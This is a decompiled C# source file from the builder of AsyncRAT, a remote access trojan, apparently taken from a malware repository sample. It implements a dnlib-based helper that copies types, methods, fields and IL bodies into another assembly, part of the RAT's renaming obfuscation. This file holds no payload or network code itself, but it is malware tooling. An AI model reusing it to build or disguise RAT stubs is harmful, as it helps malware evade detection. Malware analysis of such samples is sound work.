// Decompiled with JetBrains decompiler
// Type: Server.RenamingObfuscation.Classes.InjectHelper
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.Utils;
using System;
using System.Collections.Generic;
using System.Linq;

namespace Server.RenamingObfuscation.Classes
{
  public static class InjectHelper
  {
    private static TypeDefUser Clone(TypeDef origin)
    {
      TypeDefUser typeDefUser = new TypeDefUser(origin.Namespace, origin.Name);
      ((TypeDef) typeDefUser).Attributes = origin.Attributes;
      if (origin.ClassLayout != null)
        ((TypeDef) typeDefUser).ClassLayout = (ClassLayout) new ClassLayoutUser(origin.ClassLayout.PackingSize, origin.ClassSize);
      foreach (GenericParam genericParameter in (IEnumerable<GenericParam>) origin.GenericParameters)
        ((ICollection<GenericParam>) ((TypeDef) typeDefUser).GenericParameters).Add((GenericParam) new GenericParamUser(genericParameter.Number, genericParameter.Flags, UTF8String.op_Implicit("-")));
      return typeDefUser;
    }

    private static MethodDefUser Clone(MethodDef origin)
    {
      MethodDefUser methodDefUser = new MethodDefUser(origin.Name, (MethodSig) null, origin.ImplAttributes, origin.Attributes);
      foreach (GenericParam genericParameter in (IEnumerable<GenericParam>) origin.GenericParameters)
        ((ICollection<GenericParam>) ((MethodDef) methodDefUser).GenericParameters).Add((GenericParam) new GenericParamUser(genericParameter.Number, genericParameter.Flags, UTF8String.op_Implicit("-")));
      return methodDefUser;
    }

    private static FieldDefUser Clone(FieldDef origin) => new FieldDefUser(origin.Name, (FieldSig) null, origin.Attributes);

    private static TypeDef PopulateContext(TypeDef typeDef, InjectHelper.InjectContext ctx)
    {
      IDnlibDef idnlibDef;
      TypeDef typeDef1;
      if (!ctx.Map.TryGetValue((IDnlibDef) typeDef, out idnlibDef))
      {
        typeDef1 = (TypeDef) InjectHelper.Clone(typeDef);
        ctx.Map[(IDnlibDef) typeDef] = (IDnlibDef) typeDef1;
      }
      else
        typeDef1 = (TypeDef) idnlibDef;
      foreach (TypeDef nestedType in (IEnumerable<TypeDef>) typeDef.NestedTypes)
        ((ICollection<TypeDef>) typeDef1.NestedTypes).Add(InjectHelper.PopulateContext(nestedType, ctx));
      foreach (MethodDef method in (IEnumerable<MethodDef>) typeDef.Methods)
        ((ICollection<MethodDef>) typeDef1.Methods).Add((MethodDef) (ctx.Map[(IDnlibDef) method] = (IDnlibDef) InjectHelper.Clone(method)));
      foreach (FieldDef field in (IEnumerable<FieldDef>) typeDef.Fields)
        ((ICollection<FieldDef>) typeDef1.Fields).Add((FieldDef) (ctx.Map[(IDnlibDef) field] = (IDnlibDef) InjectHelper.Clone(field)));
      return typeDef1;
    }

    private static void CopyTypeDef(TypeDef typeDef, InjectHelper.InjectContext ctx)
    {
      TypeDef typeDef1 = (TypeDef) ctx.Map[(IDnlibDef) typeDef];
      TypeDef typeDef2 = typeDef1;
      Importer importer1 = ctx.Importer;
      ITypeDefOrRef itypeDefOrRef = ((Importer) ref importer1).Import(typeDef.BaseType);
      typeDef2.BaseType = itypeDefOrRef;
      foreach (InterfaceImpl interfaceImpl in (IEnumerable<InterfaceImpl>) typeDef.Interfaces)
      {
        IList<InterfaceImpl> interfaces = typeDef1.Interfaces;
        Importer importer2 = ctx.Importer;
        InterfaceImplUser interfaceImplUser = new InterfaceImplUser(((Importer) ref importer2).Import(interfaceImpl.Interface));
        ((ICollection<InterfaceImpl>) interfaces).Add((InterfaceImpl) interfaceImplUser);
      }
    }

    private static void CopyMethodDef(MethodDef methodDef, InjectHelper.InjectContext ctx)
    {
      MethodDef methodDef1 = (MethodDef) ctx.Map[(IDnlibDef) methodDef];
      MethodDef methodDef2 = methodDef1;
      Importer importer1 = ctx.Importer;
      CallingConventionSig callingConventionSig = ((Importer) ref importer1).Import(methodDef.Signature);
      methodDef2.Signature = callingConventionSig;
      methodDef1.Parameters.UpdateParameterTypes();
      if (methodDef.ImplMap != null)
        methodDef1.ImplMap = (ImplMap) new ImplMapUser((ModuleRef) new ModuleRefUser(ctx.TargetModule, methodDef.ImplMap.Module.Name), methodDef.ImplMap.Name, methodDef.ImplMap.Attributes);
      foreach (CustomAttribute customAttribute1 in (LazyList<CustomAttribute>) methodDef.CustomAttributes)
      {
        CustomAttributeCollection customAttributes = methodDef1.CustomAttributes;
        Importer importer2 = ctx.Importer;
        CustomAttribute customAttribute2 = new CustomAttribute((ICustomAttributeType) ((Importer) ref importer2).Import((IMethod) customAttribute1.Constructor));
        ((LazyList<CustomAttribute>) customAttributes).Add(customAttribute2);
      }
      if (!methodDef.HasBody)
        return;
      methodDef1.Body = new CilBody(methodDef.Body.InitLocals, (IList<Instruction>) new List<Instruction>(), (IList<ExceptionHandler>) new List<ExceptionHandler>(), (IList<Local>) new List<Local>());
      methodDef1.Body.MaxStack = methodDef.Body.MaxStack;
      Dictionary<object, object> bodyMap = new Dictionary<object, object>();
      foreach (Local variable in methodDef.Body.Variables)
      {
        Importer importer3 = ctx.Importer;
        Local local = new Local(((Importer) ref importer3).Import(variable.Type));
        methodDef1.Body.Variables.Add(local);
        local.Name = variable.Name;
        bodyMap[(object) variable] = (object) local;
      }
      foreach (Instruction instruction1 in (IEnumerable<Instruction>) methodDef.Body.Instructions)
      {
        Instruction instruction2 = new Instruction(instruction1.OpCode, instruction1.Operand);
        instruction2.SequencePoint = instruction1.SequencePoint;
        if (instruction2.Operand is IType)
        {
          Instruction instruction3 = instruction2;
          Importer importer4 = ctx.Importer;
          IType itype = ((Importer) ref importer4).Import((IType) instruction2.Operand);
          instruction3.Operand = (object) itype;
        }
        else if (instruction2.Operand is IMethod)
        {
          Instruction instruction4 = instruction2;
          Importer importer5 = ctx.Importer;
          IMethod imethod = ((Importer) ref importer5).Import((IMethod) instruction2.Operand);
          instruction4.Operand = (object) imethod;
        }
        else if (instruction2.Operand is IField)
        {
          Instruction instruction5 = instruction2;
          Importer importer6 = ctx.Importer;
          IField ifield = ((Importer) ref importer6).Import((IField) instruction2.Operand);
          instruction5.Operand = (object) ifield;
        }
        ((ICollection<Instruction>) methodDef1.Body.Instructions).Add(instruction2);
        bodyMap[(object) instruction1] = (object) instruction2;
      }
      foreach (Instruction instruction in (IEnumerable<Instruction>) methodDef1.Body.Instructions)
      {
        if (instruction.Operand != null && bodyMap.ContainsKey(instruction.Operand))
          instruction.Operand = bodyMap[instruction.Operand];
        else if (instruction.Operand is Instruction[])
          instruction.Operand = (object) ((IEnumerable<Instruction>) (Instruction[]) instruction.Operand).Select<Instruction, Instruction>((Func<Instruction, Instruction>) (target => (Instruction) bodyMap[(object) target])).ToArray<Instruction>();
      }
      foreach (ExceptionHandler exceptionHandler1 in (IEnumerable<ExceptionHandler>) methodDef.Body.ExceptionHandlers)
      {
        IList<ExceptionHandler> exceptionHandlers = methodDef1.Body.ExceptionHandlers;
        ExceptionHandler exceptionHandler2 = new ExceptionHandler(exceptionHandler1.HandlerType);
        ITypeDefOrRef itypeDefOrRef;
        if (exceptionHandler1.CatchType != null)
        {
          Importer importer7 = ctx.Importer;
          itypeDefOrRef = ((Importer) ref importer7).Import(exceptionHandler1.CatchType);
        }
        else
          itypeDefOrRef = (ITypeDefOrRef) null;
        exceptionHandler2.CatchType = itypeDefOrRef;
        exceptionHandler2.TryStart = (Instruction) bodyMap[(object) exceptionHandler1.TryStart];
        exceptionHandler2.TryEnd = (Instruction) bodyMap[(object) exceptionHandler1.TryEnd];
        exceptionHandler2.HandlerStart = (Instruction) bodyMap[(object) exceptionHandler1.HandlerStart];
        exceptionHandler2.HandlerEnd = (Instruction) bodyMap[(object) exceptionHandler1.HandlerEnd];
        exceptionHandler2.FilterStart = exceptionHandler1.FilterStart == null ? (Instruction) null : (Instruction) bodyMap[(object) exceptionHandler1.FilterStart];
        ((ICollection<ExceptionHandler>) exceptionHandlers).Add(exceptionHandler2);
      }
      methodDef1.Body.SimplifyMacros((IList<Parameter>) methodDef1.Parameters);
    }

    private static void CopyFieldDef(FieldDef fieldDef, InjectHelper.InjectContext ctx)
    {
      FieldDef fieldDef1 = (FieldDef) ctx.Map[(IDnlibDef) fieldDef];
      Importer importer = ctx.Importer;
      CallingConventionSig callingConventionSig = ((Importer) ref importer).Import(fieldDef.Signature);
      fieldDef1.Signature = callingConventionSig;
    }

    private static void Copy(TypeDef typeDef, InjectHelper.InjectContext ctx, bool copySelf)
    {
      if (copySelf)
        InjectHelper.CopyTypeDef(typeDef, ctx);
      foreach (TypeDef nestedType in (IEnumerable<TypeDef>) typeDef.NestedTypes)
        InjectHelper.Copy(nestedType, ctx, true);
      foreach (MethodDef method in (IEnumerable<MethodDef>) typeDef.Methods)
        InjectHelper.CopyMethodDef(method, ctx);
      foreach (FieldDef field in (IEnumerable<FieldDef>) typeDef.Fields)
        InjectHelper.CopyFieldDef(field, ctx);
    }

    public static TypeDef Inject(TypeDef typeDef, ModuleDef target)
    {
      InjectHelper.InjectContext ctx = new InjectHelper.InjectContext(typeDef.Module, target);
      InjectHelper.PopulateContext(typeDef, ctx);
      InjectHelper.Copy(typeDef, ctx, true);
      return (TypeDef) ctx.Map[(IDnlibDef) typeDef];
    }

    public static MethodDef Inject(MethodDef methodDef, ModuleDef target)
    {
      InjectHelper.InjectContext ctx = new InjectHelper.InjectContext(methodDef.Module, target);
      ctx.Map[(IDnlibDef) methodDef] = (IDnlibDef) InjectHelper.Clone(methodDef);
      InjectHelper.CopyMethodDef(methodDef, ctx);
      return (MethodDef) ctx.Map[(IDnlibDef) methodDef];
    }

    public static IEnumerable<IDnlibDef> Inject(
      TypeDef typeDef,
      TypeDef newType,
      ModuleDef target)
    {
      InjectHelper.InjectContext ctx = new InjectHelper.InjectContext(typeDef.Module, target);
      ctx.Map[(IDnlibDef) typeDef] = (IDnlibDef) newType;
      InjectHelper.PopulateContext(typeDef, ctx);
      InjectHelper.Copy(typeDef, ctx, false);
      return ((IEnumerable<IDnlibDef>) ctx.Map.Values).Except<IDnlibDef>((IEnumerable<IDnlibDef>) new TypeDef[1]
      {
        newType
      });
    }

    public class ImportResolver
    {
      public virtual TypeDef Resolve(TypeDef typeDef) => (TypeDef) null;

      public virtual MethodDef Resolve(MethodDef methodDef) => (MethodDef) null;

      public virtual FieldDef Resolve(FieldDef fieldDef) => (FieldDef) null;
    }

    private class InjectContext : InjectHelper.ImportResolver
    {
      public readonly Dictionary<IDnlibDef, IDnlibDef> Map = new Dictionary<IDnlibDef, IDnlibDef>();
      public readonly ModuleDef OriginModule;
      public readonly ModuleDef TargetModule;
      private readonly Importer importer;

      public InjectContext(ModuleDef module, ModuleDef target)
      {
        this.OriginModule = module;
        this.TargetModule = target;
        this.importer = new Importer(target, (ImporterOptions) 1);
      }

      public Importer Importer => this.importer;

      public override TypeDef Resolve(TypeDef typeDef) => this.Map.ContainsKey((IDnlibDef) typeDef) ? (TypeDef) this.Map[(IDnlibDef) typeDef] : (TypeDef) null;

      public override MethodDef Resolve(MethodDef methodDef) => this.Map.ContainsKey((IDnlibDef) methodDef) ? (MethodDef) this.Map[(IDnlibDef) methodDef] : (MethodDef) null;

      public override FieldDef Resolve(FieldDef fieldDef) => this.Map.ContainsKey((IDnlibDef) fieldDef) ? (FieldDef) this.Map[(IDnlibDef) fieldDef] : (FieldDef) null;
    }
  }
}
